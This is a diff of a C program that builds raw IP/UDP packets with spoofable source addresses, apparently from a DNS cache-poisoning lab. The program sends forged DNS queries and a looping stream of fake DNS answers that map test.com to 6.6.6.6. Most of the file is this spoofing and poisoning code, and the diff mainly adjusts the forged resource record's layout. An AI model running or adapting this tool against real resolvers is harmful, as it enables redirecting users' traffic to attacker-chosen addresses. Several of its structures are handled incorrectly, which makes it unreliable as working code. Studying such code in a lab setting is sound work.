@@ -68,17 +68,15 @@ struct dataEnd {
 	unsigned short int  class;
 };
 // total udp header length: 8 bytes (=64 bits)
-
-
+#pragma pack ( 1 )
 struct RES_RECORD {
-    unsigned char *name;
+    unsigned char name[10];
     unsigned short type;
     unsigned short class;
-    unsigned char ttl;
+    uint32_t ttl;
     unsigned short rdlength;
     unsigned char *rdata;
 };
-
 
 unsigned int checksum(uint16_t *usBuff, int isize)
 {
@@ -115,8 +113,8 @@ uint16_t check_udp_sum(uint8_t *buffer, int len)
 	
 }
 
-unsigned short csum(unsigned short *buf, int nwords) {
-
+unsigned short csum(unsigned short *buf, int nwords) 
+{
     unsigned long sum;
 
     for(sum=0; nwords>0; nwords--)
@@ -132,10 +130,8 @@ unsigned short csum(unsigned short *buf, int nwords) {
 }
 
 
-void dns_q(int argc, char* argv[]) {
-
-
-
+void dns_q(int argc, char* argv[]) 
+{
     // This is to check the argc number
     if(argc != 3){
 
@@ -205,13 +201,9 @@ void dns_q(int argc, char* argv[]) {
 
     const int *val = &one;
 
-     dns->query_id=rand(); // transaction ID for the query packet, use random #
-
-
-     
+    dns->query_id=rand(); // transaction ID for the query packet, use random #
 
     // Create a raw socket with UDP protocol
-
     sd = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
 
 
@@ -228,15 +220,11 @@ void dns_q(int argc, char* argv[]) {
     din.sin_family = AF_INET;
 
     // Port numbers
-
     sin.sin_port = htons(33333);
-
     din.sin_port = htons(53);
 
     // IP addresses
-
     sin.sin_addr.s_addr = inet_addr(argv[2]); // this is the second argument we input into the program
-
     din.sin_addr.s_addr = inet_addr(argv[1]); // this is the first argument we input into the program
 
      
@@ -317,14 +305,11 @@ void dns_q(int argc, char* argv[]) {
 }
     
 
-void dns_a(int argc, char* argv[]) {
-
+void dns_a(int argc, char* argv[]) 
+{
     if(argc != 3){
-
     	printf("- Invalid parameters!!!\nPlease enter 2 ip addresses\nFrom first to last:src_IP  dest_IP  \n");
-   
     	exit(-1);
-
     }
 
     // socket descriptor
@@ -337,31 +322,22 @@ void dns_a(int argc, char* argv[]) {
     memset(buffer, 0, PCKT_LEN);
 
     // Our own headers' structures
-
     struct ipheader *ip = (struct ipheader *) buffer;
-
-
     struct udpheader *udp = (struct udpheader *) (buffer + sizeof(struct ipheader));
-
-
-    struct dnsheader *dns=(struct dnsheader*) (buffer +sizeof(struct ipheader)+sizeof(struct udpheader));
+    struct dnsheader *dns = (struct dnsheader*) (buffer +sizeof(struct ipheader)+sizeof(struct udpheader));
 
     // data is the pointer points to the first byte of the dns payload  
     unsigned char *data=(buffer +sizeof(struct ipheader)+sizeof(struct udpheader)+sizeof(struct dnsheader));
 
-
+    //standart response
 	dns->flags=htons(FLAG_R);
     //only 1 query, so the count should be one.
 	dns->QDCOUNT=htons(1);
+    //only 1 answer
     dns->ANCOUNT=htons(1);
 
-
-
-
-
     //query string
-    //strcpy(data,"\5aaaaa\7example\3edu");
-    strcpy(data,"\4test\3com");
+    strncpy(data,"\4test\3com", 16);
     int length = strlen(data)+1;
 
 
@@ -373,25 +349,35 @@ void dns_a(int argc, char* argv[]) {
     end->class=htons(1);
 
     struct RES_RECORD* answer=(struct RES_RECORD*)(data+length+sizeof(struct dataEnd));
-    printf("Data pointer base : %u\n", (int) data);
-    printf("Data struct pointer base : %u\n", (int) end);
-    printf("RES Record struct pointer base : %u\n", (int)answer);
-    printf("Offset = %d\n", (int)answer - (int)end);
+    // printf("Data pointer base : %u\n", (int) data);
+    // printf("Data struct pointer base : %u\n", (int) end);
+    // printf("RES Record struct pointer base : %u\n", (int)answer);
 
-    //answer->name = "\4test\3com";
-    //answer->name = "\4test\3com"; 
-//answer->name is only a pointer! We send a pointer value from the internet, NOT the actual string!
-//answer->name pointer value is 607414484 even tough the buffer is -380017608 (not in same space)
-    answer->type=htons(1);
-    answer->class=htons(1);
-    answer->ttl = 3;
+    strcpy(answer, "\4test\3com");
+    answer->type = htons(1);
+    answer->class = htons(1);
+    answer->ttl = htonl(82400);
+    answer->rdlength = htons(1);
+
+    printf("name offset:      %d name size:      %d\n", (int)&answer->name - (int)answer, strlen(answer->name)+1);
+    printf("type offset:      %d type size:      %d\n", (int)&answer->type - (int)answer, sizeof(answer->type));
+    printf("class offset:     %d class size:     %d\n", (int)&answer->class - (int)answer, sizeof(answer->class));
+    printf("ttl offset:       %d ttl size:       %d\n", (int)&answer->ttl - (int)answer, sizeof(answer->ttl));
+    printf("rdlength offset:  %d rdlength size:  %d\n", (int)&answer->rdlength - (int)answer, sizeof(answer->rdlength));
+    printf("rdata offset:     %d rdata size:     %d\n", (int)&answer->rdata - (int)answer, sizeof(answer->rdata));
+
+    int class_offset = (int)&answer->class - (int)answer;
+    int ttl_offset = (int)&answer->ttl - (int)answer;
+
+    printf("ttl offset - class offset = %d\n", ttl_offset - class_offset);
     answer->rdata = inet_addr("6.6.6.6");
-    answer->rdlength = 4;//RFC 1035  4.1.3
 
+    
 
-    // for(int i = 0; i < 100; i++) {
-    //     printf("%x\\ ", *(data + i));
+    // for(int i = 0; i < 50; i++) {
+    //     printf("%x ", *(data + i));
     // }
+    // printf("\n");
 
     struct sockaddr_in sin, din;
     int one = 1;
@@ -420,59 +406,32 @@ void dns_a(int argc, char* argv[]) {
     // Fabricate the IP header or we can use the
 
     // standard header structures but assign our own values.
-
     ip->iph_ihl = 5;
-
-
     ip->iph_ver = 4;
-
-
     ip->iph_tos = 0; // Low delay
 
 
     unsigned short int packetLength =(sizeof(struct ipheader) + sizeof(struct udpheader)+sizeof(struct dnsheader)+length+sizeof(struct dataEnd)+sizeof(struct RES_RECORD)+length); // length + dataEnd_size == UDP_payload_size
     //printf("Packet length = %d\n", packetLength);
     ip->iph_len=htons(packetLength);
-
     ip->iph_ident = htons(rand()); // we give a random number for the identification#
-
-
     ip->iph_ttl = 110; // hops
-
     ip->iph_protocol = 17; // UDP
-
     // Source IP address, can use spoofed address here!!!
-
     ip->iph_sourceip = inet_addr(argv[1]);
-
     // The destination IP address
-
     ip->iph_destip = inet_addr(argv[2]);
-
     udp->udph_srcport = htons(40000+rand()%10000);  // source port number, I make them random... remember the lower number may be reserved
-
     // Destination port number
-
     udp->udph_destport = htons(53);
-
-
     udp->udph_len = htons(sizeof(struct udpheader)+sizeof(struct dnsheader)+length+sizeof(struct dataEnd)+sizeof(struct RES_RECORD)); // udp_header_size + udp_payload_size
-
     ip->iph_chksum = csum((unsigned short *)buffer, sizeof(struct ipheader) + sizeof(struct udpheader));
- 
-
     udp->udph_chksum=check_udp_sum(buffer, packetLength-sizeof(struct ipheader));
-
-
     // Inform the kernel do not fill up the packet structure. we will build our own...
     if(setsockopt(sd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one))<0 ) {
         printf("error\n");	
         exit(-1);
     }
-
-
-
-
     int num_max_packets = 10;
     int i = 0;
     while(1) {	
@@ -482,9 +441,6 @@ void dns_a(int argc, char* argv[]) {
         // int charnumber;
         // charnumber=1+rand()%5;
         // *(data+charnumber)+=1;
-
-
-
         udp->udph_chksum=check_udp_sum(buffer, packetLength-sizeof(struct ipheader)); // recalculate the checksum for the UDP packet
 
     if(sendto(sd, buffer, packetLength, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
@@ -497,5 +453,6 @@ int main(int argc, char *argv[])
 {
     //dns_q(argc, argv);
     dns_a(argc, argv);
+    return 0;
 }
 
